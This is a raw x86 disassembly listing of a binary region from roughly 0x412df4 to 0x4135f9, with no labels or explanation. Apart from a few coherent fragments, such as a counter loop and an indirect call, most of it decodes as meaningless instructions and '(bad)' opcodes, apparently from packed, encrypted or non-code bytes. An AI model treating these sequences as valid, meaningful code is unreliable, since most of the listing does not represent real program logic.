  412df4:	inc    ebx
  412df5:	mov    ch,0x7e
  412df7:	add    BYTE PTR [ecx-0x4],cl
  412dfa:	jl     0x412e5d
  412dfc:	sbb    DWORD PTR [edx+0x6a50f1b5],edx
  412e02:	inc    esp
  412e03:	pop    ebp
  412e04:	pop    es
  412e05:	sub    edi,eax
  412e07:	shr    BYTE PTR [ebx-0x55],1
  412e0a:	and    bl,ah
  412e0c:	add    DWORD PTR [edi+0x1c2581ce],eax
  412e12:	loope  0x412e56
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edi],bp
  412e76:	inc    esp
  412e77:	jmp    0x412e0b
  412e79:	pop    edx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0xb170707e
  412e82:	call   0x25b6:0x534c5541
  412e89:	bnd jnp 0x412e24
  412e8c:	clc    
  412e8d:	pop    edi
  412e8e:	cdq    
  412e8f:	test   BYTE PTR [edx],0x30
  412e92:	jg     0x412ed1
  412e94:	in     eax,0x6f
  412e96:	xchg   ecx,eax
  412e97:	jb     0x412e85
  412e99:	jbe    0x412ec9
  412e9b:	div    BYTE PTR fs:[eax+ecx*2]
  412e9f:	enter  0x4bb5,0x1e
  412ea3:	lods   eax,DWORD PTR ds:[esi]
  412ea4:	in     al,dx
  412ea5:	push   cs
  412ea6:	mov    esi,0x18b9a154
  412eab:	(bad)  
  412eac:	lock out dx,al
  412eae:	arpl   WORD PTR [ecx-0x7d],bx
  412eb1:	test   al,bh
  412eb3:	bound  ecx,QWORD PTR [ebp+0x49c7373b]
  412eb9:	push   edx
  412eba:	ss pop esp
  412ebc:	xchg   BYTE PTR [esi-0x2d0e4d40],dl
  412ec2:	stc    
  412ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec4:	(bad)  
  412ec6:	or     BYTE PTR [ecx],bh
  412ec8:	hlt    
  412ec9:	pushf  
  412eca:	js     0x412e82
  412ecc:	retf   0xb75b
  412ecf:	loopne 0x412ef5
  412ed1:	adc    DWORD PTR [esi],eax
  412ed3:	jecxz  0x412f4c
  412ed5:	jae    0x412e76
  412ed7:	mov    ch,0x74
  412ed9:	mov    ds:0xe1ea8721,eax
  412ede:	mov    esp,0x47de90cf
  412ee3:	pop    ebx
  412ee4:	repnz loope 0x412edc
  412ee7:	adc    WORD PTR ds:0x4e5a33f9,0xa96e
  412ef0:	push   ecx
  412ef1:	repz push edx
  412ef3:	(bad)  
  412ef4:	daa    
  412ef5:	ins    DWORD PTR es:[edi],dx
  412ef6:	fld    TBYTE PTR [eax]
  412ef8:	push   esp
  412ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412efa:	jle    0x412e9b
  412efc:	lea    edx,[edi+0x7811c08a]
  412f02:	addr16 jns 0x412e95
  412f05:	stc    
  412f06:	pop    esi
  412f07:	mov    ecx,DWORD PTR [ecx+ecx*1-0xa]
  412f0b:	leave  
  412f0c:	aaa    
  412f0d:	adc    DWORD PTR [ecx+edi*4],ebx
  412f10:	pop    eax
  412f11:	mov    ecx,esi
  412f13:	or     eax,0x3c5d8597
  412f18:	in     al,0x9e
  412f1a:	ret    
  412f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f1c:	retf   0x9e79
  412f1f:	(bad)  
  412f21:	mov    ah,dl
  412f23:	lahf   
  412f24:	jg     0x412f49
  412f26:	pop    esp
  412f27:	mov    edi,0x55c95adb
  412f2c:	push   es
  412f2d:	aas    
  412f2e:	push   ebp
  412f2f:	xchg   ecx,eax
  412f30:	leave  
  412f31:	push   ss
  412f32:	test   esp,esi
  412f34:	xchg   esp,eax
  412f35:	jge    0x412f8f
  412f37:	cwde   
  412f38:	cli    
  412f39:	lahf   
  412f3a:	popa   
  412f3b:	sti    
  412f3c:	or     eax,0xa694900b
  412f41:	or     edx,DWORD PTR [eax]
  412f43:	icebp  
  412f44:	push   ds
  412f45:	inc    ebp
  412f46:	int3   
  412f47:	push   0xb2535afc
  412f4c:	or     DWORD PTR [eax-0x172a0da2],ebp
  412f52:	dec    ecx
  412f53:	and    BYTE PTR [ecx+ecx*8-0x76aac8d3],al
  412f5a:	xor    bh,ah
  412f5c:	lods   eax,DWORD PTR ds:[esi]
  412f5d:	and    DWORD PTR [esi-0x1f],edi
  412f60:	sahf   
  412f61:	lock cmove esp,DWORD PTR [edi+0x85ada6a]
  412f69:	sub    BYTE PTR [ebp-0x61164f03],bh
  412f6f:	ins    DWORD PTR es:[edi],dx
  412f70:	mov    WORD PTR [ebp+edx*8-0x6492f805],?
  412f77:	cs in  eax,0x3a
  412f7a:	dec    eax
  412f7b:	or     al,0x46
  412f7d:	cmp    DWORD PTR [ecx],edx
  412f7f:	popf   
  412f80:	adc    DWORD PTR [ebx-0x4b8a29da],0x74
  412f87:	mov    ebx,es
  412f89:	cmp    BYTE PTR [ebx],cl
  412f8b:	scas   eax,DWORD PTR es:[edi]
  412f8c:	popa   
  412f8d:	sbb    al,0x14
  412f8f:	bound  edi,QWORD PTR [ebp+0x40]
  412f92:	mov    ah,0xb9
  412f94:	mov    al,BYTE PTR [esp+edi*1-0x3667a00a]
  412f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f9c:	mov    esi,0x8dcee4f3
  412fa1:	lods   eax,DWORD PTR ds:[esi]
  412fa2:	xor    bh,BYTE PTR [ebp+0x1a]
  412fa5:	add    BYTE PTR [eax-0x76816a09],bl
  412fab:	arpl   WORD PTR [esi+0x4e],bx
  412fae:	lock cmc 
  412fb0:	int3   
  412fb1:	dec    ebx
  412fb2:	in     al,0x55
  412fb4:	mov    DWORD PTR [esi+0x28dca5d1],ebp
  412fba:	pop    edi
  412fbb:	inc    ebp
  412fbc:	sbb    al,0xde
  412fbe:	out    dx,eax
  412fbf:	in     eax,dx
  412fc0:	and    ch,BYTE PTR [esi-0x499d9fba]
  412fc6:	nop
  412fc7:	vmread DWORD PTR [edi+edx*2],eax
  412fcb:	push   ebx
  412fcc:	and    DWORD PTR [ebx-0x39037b3d],esi
  412fd2:	cmp    eax,0xc593951e
  412fd7:	cmp    DWORD PTR [ecx-0x77],0x3b
  412fdb:	and    eax,0xe179a253
  412fe0:	jl     0x412fd6
  412fe2:	mov    BYTE PTR [edx-0x781539c4],ah
  412fe8:	mov    edx,0x58f8f832
  412fed:	in     al,0xa6
  412fef:	push   es
  412ff0:	int3   
  412ff1:	shl    ebp,1
  412ff3:	push   0x639cc525
  412ff8:	outs   dx,BYTE PTR ds:[esi]
  412ff9:	aam    0x20
  412ffb:	aas    
  412ffc:	inc    ebx
  412ffd:	xor    BYTE PTR [ecx],bh
  412fff:	sub    dh,BYTE PTR [eax+0x7c]
  413002:	mov    esp,0x20ef90aa
  413007:	pop    esi
  413008:	nop
  413009:	cs retf 0xc0f6
  41300d:	dec    ecx
  41300e:	sbb    al,0xc0
  413010:	ins    DWORD PTR es:[edi],dx
  413011:	pop    ecx
  413012:	out    dx,eax
  413013:	(bad)  
  413014:	faddp  st(3),st
  413016:	stos   DWORD PTR es:[edi],eax
  413017:	pop    ecx
  413018:	jmp    0xa2b9:0xfc08d01e
  41301f:	pop    eax
  413020:	xor    al,0xc0
  413022:	test   BYTE PTR [esi],cl
  413024:	mov    al,0x94
  413026:	or     esi,DWORD PTR [esi-0x44]
  413029:	mov    cl,0x2b
  41302b:	fnstenv [esi]
  41302d:	loope  0x413011
  41302f:	lea    ebp,[edi+ecx*2+0x6317c07c]
  413036:	xchg   ebx,eax
  413037:	jb     0x413006
  413039:	mov    BYTE PTR [edi-0x60],cl
  41303c:	cmp    DWORD PTR [edi-0x5b],edi
  41303f:	in     al,0xa0
  413041:	push   esi
  413042:	lods   al,BYTE PTR ds:[esi]
  413043:	shl    BYTE PTR [edx+0x3b],cl
  413046:	xor    dl,BYTE PTR [ecx]
  413048:	ins    BYTE PTR es:[edi],dx
  413049:	mov    edx,0x9ca08064
  41304e:	icebp  
  41304f:	push   0x7149ecc9
  413054:	outs   dx,BYTE PTR ds:[esi]
  413055:	mov    WORD PTR [edx+0x47],fs
  413058:	push   ds
  413059:	add    BYTE PTR [ecx+eax*8+0x3ea29f7b],al
  413060:	(bad)  
  413062:	fidivr WORD PTR [edx]
  413064:	bnd je 0x413065
  413067:	push   edx
  413068:	dec    edx
  413069:	adc    eax,ecx
  41306b:	push   edi
  41306c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41306d:	xchg   ecx,eax
  41306e:	rcr    DWORD PTR [ecx-0x18],cl
  413071:	mov    eax,0x171d10f
  413076:	xor    edx,DWORD PTR [edx+0x4a]
  413079:	add    DWORD PTR [edx],ecx
  41307b:	pop    ebx
  41307c:	pop    ss
  41307d:	and    al,0x4a
  41307f:	inc    ebp
  413080:	sbb    BYTE PTR [edi+0x53],0xff
  413084:	pop    esp
  413085:	pushf  
  413086:	jg     0x413027
  413088:	or     DWORD PTR [ecx-0x69],edx
  41308b:	xor    BYTE PTR [edi+0x1e9e8e3c],bl
  413091:	mov    dl,0xee
  413093:	push   ebx
  413094:	inc    ecx
  413095:	mov    bh,bl
  413097:	sub    dl,dl
  413099:	mov    ah,0xcb
  41309b:	sbb    ah,dh
  41309d:	or     BYTE PTR [ebx-0x74],0xc6
  4130a1:	sub    ebp,edx
  4130a3:	mov    ebp,DWORD PTR [edi+ecx*1]
  4130a6:	jo     0x41307a
  4130a8:	loop   0x41308a
  4130aa:	sub    eax,0xc61234ff
  4130af:	jns    0x41307f
  4130b1:	adc    al,0xd4
  4130b3:	cld    
  4130b4:	xor    BYTE PTR [esi-0x52],ah
  4130b7:	js     0x413079
  4130b9:	push   es
  4130ba:	cmp    ebx,DWORD PTR [esi+edi*4]
  4130bd:	jle    0x413131
  4130bf:	mov    ebp,0x952dc810
  4130c4:	jp     0x413066
  4130c6:	mov    esp,0x6df97a7a
  4130cb:	test   DWORD PTR [edx],esi
  4130cd:	ins    BYTE PTR es:[edi],dx
  4130ce:	lds    ebx,FWORD PTR [ebx+0x338de970]
  4130d4:	mov    al,ds:0x8af2d664
  4130d9:	dec    edi
  4130da:	or     esi,esp
  4130dc:	xor    BYTE PTR [esi+0x2de55e58],ah
  4130e2:	shl    BYTE PTR [eax-0x525345e8],0x61
  4130e9:	push   0x57
  4130eb:	scas   eax,DWORD PTR es:[edi]
  4130ec:	xor    eax,DWORD PTR [esp+ebp*8+0x3b6bf4e5]
  4130f3:	inc    eax
  4130f4:	jno    0x413109
  4130f6:	imul   edi,DWORD PTR [esp+esi*2+0x4fabebe7],0xff02b30
  413101:	enter  0x6a5b,0x54
  413105:	xchg   edi,eax
  413106:	adc    DWORD PTR [di+0x18b3],eax
  41310b:	fnstsw WORD PTR [eax]
  41310d:	shr    BYTE PTR [eax-0x5e663449],1
  413113:	xchg   ebp,eax
  413114:	sbb    ch,ch
  413116:	(bad)  
  413117:	mov    edx,DWORD PTR [esi]
  413119:	js     0x41310c
  41311b:	mov    esp,0x7f42bf2
  413120:	jns    0x4130a5
  413122:	popa   
  413123:	addr16 push 0xfb70a22f
  413129:	arpl   WORD PTR [ebx-0x3e],di
  41312c:	xchg   DWORD PTR [edx],esi
  41312e:	sbb    DWORD PTR [ebx+0x5b482f5d],ebp
  413134:	into   
  413135:	fdivp  st(0),st
  413137:	push   ds
  413138:	add    DWORD PTR [esi],edi
  41313a:	shr    edx,0xc6
  41313d:	ret    0x5820
  413140:	inc    edx
  413141:	jbe    0x41311f
  413143:	or     BYTE PTR ss:[edx+0x7589f180],cl
  41314a:	fmul   DWORD PTR [ecx+0x7589d475]
  413150:	in     al,dx
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41317f:	fnstsw WORD PTR ds:0x7061a3d5
  413185:	jo     0x413140
  413187:	jle    0x4131f9
  413189:	jo     0x41316c
  41318b:	xchg   esp,eax
  41318c:	in     eax,dx
  41318d:	outs   dx,DWORD PTR ds:[esi]
  41318e:	(bad)  
  413190:	mov    edx,0xa2ef551e
  413195:	xor    BYTE PTR [ecx-0x5f0430fc],0xa2
  41319c:	test   ch,al
  41319e:	and    BYTE PTR [eax],bh
  4131a0:	imul   ecx,DWORD PTR cs:[ebx-0x29],0x26bd83d4
  4131a8:	fcom   DWORD PTR [ebp-0x1e80d51b]
  4131ae:	cmp    ah,BYTE PTR [esi]
  4131b0:	mov    cl,0x7
  4131b2:	dec    esp
  4131b3:	outs   dx,DWORD PTR ds:[esi]
  4131b4:	test   al,al
  4131b6:	shl    BYTE PTR [esp+ebx*2-0x4d337d6b],0xe7
  4131be:	sub    BYTE PTR [ebp+0x2a0440da],ah
  4131c4:	lods   eax,DWORD PTR ds:[esi]
  4131c5:	daa    
  4131c6:	mov    bh,cl
  4131c8:	lea    ecx,[eax+0x7b]
  4131cb:	add    dl,BYTE PTR [ecx+ebx*2]
  4131ce:	cmp    eax,DWORD PTR [ecx]
  4131d0:	(bad)  
  4131d1:	pop    edx
  4131d2:	jne    0x413251
  4131d4:	add    eax,0xa5c9221
  4131d9:	cmp    eax,0x6a6f7b1b
  4131de:	xchg   edi,eax
  4131df:	xor    dl,BYTE PTR [edi-0x57]
  4131e2:	mov    al,ds:0x52ad9d1f
  4131e7:	mov    eax,0xb9119cfa
  4131ec:	ds push ebp
  4131ee:	dec    ecx
  4131ef:	mov    bh,0xe0
  4131f1:	out    dx,eax
  4131f2:	shl    BYTE PTR [eax-0x1a1732e5],0xea
  4131f9:	das    
  4131fa:	into   
  4131fb:	addr16 enter 0x3935,0xe4
  413200:	fsub   DWORD PTR [esi+ebx*1-0x5f602c46]
  413207:	xchg   ebx,eax
  413208:	ret    0x44a
  41320b:	aas    
  41320c:	add    al,BYTE PTR [edx-0x24875c27]
  413212:	fidiv  DWORD PTR [ebp+0x23]
  413215:	xor    al,0xdf
  413217:	or     BYTE PTR [ebx-0x4021635e],ch
  41321d:	xchg   ebp,eax
  41321e:	xchg   edi,eax
  41321f:	xor    BYTE PTR [eax-0x58c01965],ah
  413225:	cmp    ah,BYTE PTR [esi-0x84289f6]
  41322b:	out    0x51,eax
  41322d:	call   0x1954:0x5bd7bbf7
  413234:	cs mov ch,0x43
  413237:	imul   BYTE PTR [ebp+0x5e79dae6]
  41323d:	push   esp
  41323e:	rcr    DWORD PTR [ebx+edi*4-0x2],0x2a
  413243:	pop    ds
  413244:	jmp    DWORD PTR [eax-0xe]
  413247:	jge    0x4132ba
  413249:	js     0x413259
  41324b:	lahf   
  41324c:	stc    
  41324d:	stos   BYTE PTR es:[edi],al
  41324e:	loopne 0x4131e4
  413250:	adc    ebx,DWORD PTR [edx]
  413252:	sbb    esi,esp
  413254:	gs jns 0x4132ad
  413257:	xor    DWORD PTR [ebx+0x2278ea47],eax
  41325d:	idiv   DWORD PTR [eax+ebp*4]
  413260:	xchg   edx,eax
  413261:	enter  0x99fe,0xc0
  413265:	mov    edi,0x6dbfc4ad
  41326a:	inc    ebx
  41326b:	jl     0x4132c9
  41326d:	aas    
  41326e:	xlat   BYTE PTR ds:[ebx]
  41326f:	mov    edi,0xadabdfc3
  413274:	mov    edx,DWORD PTR [ebx+ebx*4-0x3970f10e]
  41327b:	mov    ?,WORD PTR [esi+ebp*4+0x326520d7]
  413282:	ror    BYTE PTR [eax+0x14b54d8d],cl
  413288:	dec    ecx
  413289:	out    0x68,eax
  41328b:	sbb    al,0x70
  41328d:	cmp    eax,0xde3b636f
  413292:	test   eax,0x90ebfd67
  413297:	outs   dx,DWORD PTR ds:[esi]
  413298:	mov    edx,0xc5078bdd
  41329d:	and    eax,0x18b7ca89
  4132a2:	scas   al,BYTE PTR es:[edi]
  4132a3:	push   eax
  4132a4:	mov    cs,WORD PTR [esi]
  4132a6:	sar    BYTE PTR [ebx+0x1c],1
  4132a9:	mov    dh,0x8e
  4132ab:	rcr    DWORD PTR [edx-0x41ff53ee],1
  4132b1:	repnz mov esp,0xc25ef6b4
  4132b7:	mov    edi,0xc76bc16e
  4132bc:	pusha  
  4132bd:	cdq    
  4132be:	rcl    DWORD PTR [esi+0x1a],1
  4132c1:	into   
  4132c2:	dec    eax
  4132c3:	adc    eax,ebx
  4132c5:	dec    eax
  4132c6:	inc    edi
  4132c7:	aas    
  4132c8:	f2xm1  
  4132ca:	mov    bh,0xa6
  4132cc:	sub    DWORD PTR [ecx+ebp*2+0x6b902158],eax
  4132d3:	jnp    0x4132bb
  4132d5:	scas   al,BYTE PTR es:[edi]
  4132d6:	mov    ds:0x5d515119,al
  4132db:	xor    eax,0x91c72e03
  4132e0:	push   cs
  4132e1:	xchg   ebp,eax
  4132e2:	mov    ch,0xaf
  4132e4:	stc    
  4132e5:	out    0x90,al
  4132e7:	xor    BYTE PTR [ebx-0x5ac259e4],dl
  4132ed:	cwde   
  4132ee:	sub    DWORD PTR [esi],edx
  4132f0:	ror    dh,cl
  4132f2:	adc    al,0x56
  4132f4:	xchg   esi,eax
  4132f5:	ds inc esp
  4132f7:	loope  0x413363
  4132f9:	test   bh,0xbf
  4132fc:	sbb    DWORD PTR [edi-0x69124da4],edi
  413302:	mov    ch,BYTE PTR [edi-0x7]
  413305:	ss imul ebx,eax,0x9e3d87d0
  41330c:	fldcw  WORD PTR [ebx-0x67752a79]
  413312:	xor    esp,ebp
  413314:	mov    ebx,DWORD PTR ds:0x239859dd
  41331a:	adc    ah,BYTE PTR [esi+0x53]
  41331d:	pop    ebp
  41331e:	test   al,0xc0
  413320:	popa   
  413321:	jmp    0x40c1:0x6fc04258
  413328:	es mov ch,0xbf
  41332b:	fwait
  41332c:	call   FWORD PTR [esi]
  41332e:	dec    edi
  41332f:	dec    esi
  413330:	sbb    al,0x3
  413332:	aas    
  413333:	rol    bh,cl
  413335:	sbb    esi,esi
  413337:	cmp    eax,0xc428e9f3
  41333c:	xor    BYTE PTR [ebx-0x2d4f7fc6],dl
  413342:	push   esp
  413343:	fisubr WORD PTR [edi]
  413345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413346:	cwde   
  413347:	(bad)  
  413348:	(bad)  
  413349:	pop    ebp
  41334a:	adc    eax,0x3e80c2fc
  41334f:	ficom  DWORD PTR [ebx-0x1e]
  413352:	inc    ebx
  413353:	inc    eax
  413354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413355:	test   al,0x4b
  413357:	add    BYTE PTR [edi],0xc7
  41335a:	dec    DWORD PTR [edi+0x3a]
  41335d:	loopne 0x41336c
  41335f:	aas    
  413360:	nop
  413361:	cmp    ah,bl
  413363:	pop    esi
  413364:	js     0x413362
  413366:	xchg   ecx,eax
  413367:	stc    
  413368:	stos   DWORD PTR es:[edi],eax
  413369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41336a:	popa   
  41336b:	(bad)  
  41336c:	int    0x56
  41336e:	call   0x59b:0x9b22a33
  413375:	mov    eax,ds:0x67f173b
  41337a:	jmp    0x8a7e:0xcd2c97a5
  413381:	(bad)  
  413382:	frstor ds:0xe68b83f2
  413388:	push   ds
  413389:	mov    eax,0xbcfd6fb1
  41338e:	outs   dx,DWORD PTR ds:[esi]
  41338f:	lods   eax,DWORD PTR ds:[esi]
  413390:	aad    0xa8
  413392:	loopne 0x4133b7
  413394:	adc    edx,edi
  413396:	call   DWORD PTR cs:[edx-0x7d]
  41339a:	ret    0x581c
  41339d:	mov    ch,0xe8
  41339f:	jbe    0x413385
  4133a1:	and    esp,ebp
  4133a3:	outs   dx,BYTE PTR ds:[esi]
  4133a4:	adc    DWORD PTR [ebp+0xb],esi
  4133a7:	das    
  4133a8:	js     0x413338
  4133aa:	aam    0xeb
  4133ac:	jb     0x413415
  4133ae:	ds sbb BYTE PTR ss:[edi+0x4540197e],bh
  4133b6:	test   BYTE PTR [esi],dl
  4133b8:	ins    BYTE PTR es:[edi],dx
  4133b9:	push   edi
  4133ba:	lea    ecx,[ebp+0xe]
  4133bd:	lea    edx,[ecx+0x57]
  4133c0:	and    eax,0xfb19cbea
  4133c5:	adc    al,0xac
  4133c7:	iret   
  4133c8:	jmp    0x69af:0x4af9abdf
  4133cf:	jb     0x41344f
  4133d1:	jl     0x41339a
  4133d3:	push   esp
  4133d4:	ins    WORD PTR es:[edi],dx
  4133d6:	loop   0x4133ac
  4133d8:	into   
  4133d9:	fimul  DWORD PTR [edx+ebx*4-0x57]
  4133dd:	xchg   esp,eax
  4133de:	jo     0x41342d
  4133e0:	ins    BYTE PTR es:[edi],dx
  4133e1:	in     eax,dx
  4133e2:	bound  edx,QWORD PTR [ebp+0x20]
  4133e5:	and    al,BYTE PTR [eax]
  4133e7:	std    
  4133e8:	in     eax,dx
  4133e9:	(bad)  
  4133ea:	ins    BYTE PTR es:[edi],dx
  4133eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ec:	ret    
  4133ed:	out    0x54,al
  4133ef:	cmp    esp,DWORD PTR [edx-0x5b]
  4133f2:	popf   
  4133f3:	ror    ah,1
  4133f5:	loope  0x413432
  4133f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133f8:	jecxz  0x413439
  4133fa:	cmp    cl,al
  4133fc:	in     eax,dx
  4133fd:	mul    DWORD PTR [edi]
  4133ff:	sub    al,0x33
  413401:	cmp    al,0x9e
  413403:	add    ah,BYTE PTR [eax+0x64924cb5]
  413409:	popf   
  41340a:	mov    dl,0xc3
  41340c:	dec    ebp
  41340d:	cs inc ebx
  41340f:	sahf   
  413410:	arpl   bx,di
  413412:	test   eax,0x68f8426f
  413417:	fistp  WORD PTR [esi+0x71]
  41341a:	jmp    0xc14d:0xb9d48256
  413421:	and    dl,dh
  413423:	xor    eax,0x636eb97a
  413428:	fsub   QWORD PTR [ebp+0x5b]
  41342b:	mov    ebx,0x9fda959e
  413430:	test   BYTE PTR [edx-0xf055f88],dl
  413436:	nop
  413437:	cdq    
  413438:	cmp    al,BYTE PTR [eax+0x3ed3f5f9]
  41343e:	pushf  
  41343f:	lds    ecx,FWORD PTR [eax+0x5f]
  413442:	mov    esi,0xec7a3476
  413447:	inc    ecx
  413448:	mov    dh,BYTE PTR [eax]
  41344a:	(bad)  
  41344b:	loop   0x41343b
  41344d:	push   0x3e15c67
  413452:	retf   
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xad63100f,al
  413492:	clc    
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xfe70707e
  41349c:	mov    ebx,0xca4b2d37
  4134a1:	push   0xc8035603
  4134a6:	xchg   esi,eax
  4134a7:	xchg   ecx,eax
  4134a8:	push   ecx
  4134a9:	fisttp DWORD PTR [edi]
  4134ab:	mov    esi,0x51cb3bb7
  4134b0:	ja     0x413451
  4134b2:	sti    
  4134b3:	or     BYTE PTR [ebx],bh
  4134b5:	scas   al,BYTE PTR es:[edi]
  4134b6:	sub    cl,dh
  4134b8:	ret    0xcbea
  4134bb:	int3   
  4134bc:	fstp   TBYTE PTR [eax-0x15173bc6]
  4134c2:	mov    edi,0x5e4f5d85
  4134c7:	mov    dh,0x63
  4134c9:	add    BYTE PTR ds:0x5e4a032d,0xa1
  4134d0:	cmc    
  4134d1:	pop    esp
  4134d2:	mov    gs,WORD PTR [ecx]
  4134d4:	and    eax,0x3ac25698
  4134d9:	das    
  4134da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134dc:	aaa    
  4134dd:	pop    es
  4134de:	call   0x34f72250
  4134e3:	std    
  4134e4:	sub    DWORD PTR [ecx+0x4f],ebx
  4134e7:	mov    ds:0x6e58e1f1,al
  4134ec:	dec    BYTE PTR [ecx]
  4134ee:	dec    ecx
  4134ef:	int3   
  4134f0:	mov    bh,0x2a
  4134f2:	frstor [eax]
  4134f4:	jl     0x41348d
  4134f6:	dec    esp
  4134f7:	sbb    bh,BYTE PTR [ebx+0x34]
  4134fa:	(bad)  
  4134fb:	cmp    bh,BYTE PTR [edi]
  4134fd:	push   esp
  4134fe:	leave  
  4134ff:	cdq    
  413500:	inc    edi
  413501:	pop    ebp
  413502:	out    0x6f,eax
  413504:	add    BYTE PTR [ecx],bh
  413506:	mov    dh,0x22
  413508:	imul   esi,DWORD PTR [edx-0x32],0xc
  41350c:	rcl    BYTE PTR [edx-0x21381dbb],cl
  413512:	jo     0x4134f9
  413514:	call   0x5c4c:0x4e83e4e7
  41351b:	xchg   ebp,eax
  41351c:	cwde   
  41351d:	xor    DWORD PTR [ecx-0x124b0717],edx
  413523:	mov    ecx,0x66724878
  413528:	test   al,0x39
  41352a:	mov    eax,0x2c6744d8
  41352f:	mov    BYTE PTR [edi+0x72],0xd3
  413533:	rol    BYTE PTR [eax-0x2e],cl
  413536:	pop    edi
  413537:	add    ah,0x1c
  41353a:	or     eax,0x4492caaa
  41353f:	das    
  413540:	and    BYTE PTR ds:0x5c1c0d77,dl
  413546:	shl    DWORD PTR [edi-0x32],1
  413549:	cld    
  41354a:	jmp    0xd859:0x7d61907e
  413551:	sub    BYTE PTR [esi+esi*4-0x1c5eaaf0],al
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	inc    ecx
  41355a:	lods   al,BYTE PTR ds:[esi]
  41355b:	xor    ebp,ebx
  41355d:	outs   dx,BYTE PTR ds:[esi]
  41355e:	jmp    0x5ef3:0x1186293f
  413565:	pop    ebx
  413566:	sbb    BYTE PTR [ecx-0x4ac3d210],dh
  41356c:	dec    ebx
  41356d:	jns    0x4135bd
  41356f:	adc    bl,dl
  413571:	imul   ecx,ecx,0x64eb458d
  413577:	test   DWORD PTR [esp+ebp*4+0x6ff74d27],ecx
  41357e:	fdiv   DWORD PTR [ebp-0x54c6d000]
  413584:	push   ebx
  413585:	dec    ebx
  413586:	rcl    BYTE PTR [edx],1
  413588:	sub    eax,esp
  41358a:	in     al,0xc2
  41358c:	push   ebx
  41358d:	adc    esi,ecx
  41358f:	lock dec esi
  413591:	int    0x4
  413593:	pusha  
  413594:	inc    edx
  413595:	mov    cl,0xb9
  413597:	(bad)  
  413598:	aad    0xf2
  41359a:	cmp    al,0xae
  41359c:	inc    edx
  41359d:	mov    eax,0x4823c236
  4135a2:	(bad)  
  4135a4:	cwde   
  4135a5:	push   0xffffffcd
  4135a7:	ins    BYTE PTR es:[edi],dx
  4135a8:	bound  ecx,QWORD PTR [ebx-0x3bf21361]
  4135ae:	(bad)  
  4135af:	stc    
  4135b0:	pop    ds
  4135b1:	sub    cl,BYTE PTR [esi+esi*2-0x59eacdaa]
  4135b8:	pop    es
  4135b9:	pop    ebp
  4135ba:	scas   eax,DWORD PTR es:[edi]
  4135bb:	xor    al,0x39
  4135bd:	mov    cl,BYTE PTR [edx+0x13]
  4135c0:	mov    ebx,0xae6eb52d
  4135c5:	sti    
  4135c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c7:	stc    
  4135c8:	sbb    dh,BYTE PTR [eax-0x7ea0d216]
  4135ce:	cmp    al,0xd5
  4135d0:	inc    ebp
  4135d1:	dec    edi
  4135d2:	push   0xb4793ad0
  4135d7:	mov    edx,0x6f39ee1e
  4135dc:	and    DWORD PTR [ecx-0x11],ebx
  4135df:	jno    0x41363b
  4135e1:	lods   al,BYTE PTR ds:[esi]
  4135e2:	push   ds
  4135e3:	push   es
  4135e4:	loope  0x41363c
  4135e6:	jmp    DWORD PTR [ebx]
  4135e8:	cs (bad) 
  4135ea:	je     0x4135cd
  4135ec:	mov    dh,0x90
  4135ee:	sub    bl,0x50
  4135f1:	stos   DWORD PTR es:[edi],eax
  4135f2:	sahf   
  4135f3:	cwde   
  4135f4:	pop    eax
  4135f5:	pop    es
  4135f6:	addr16 or al,0x6f
  4135f9:	iret   
